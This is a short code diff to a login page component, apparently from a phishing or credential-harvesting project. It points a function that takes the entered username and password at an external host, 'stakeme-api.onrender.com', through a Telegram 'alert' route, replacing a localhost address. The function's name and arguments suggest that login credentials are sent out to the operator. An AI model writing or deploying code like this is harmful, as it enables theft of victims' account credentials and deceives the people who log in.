@@ -57,7 +57,7 @@ export default function Login() {
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
     try {
-      await fetch('http://localhost:3000/api/telegram/alert', {
+      await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
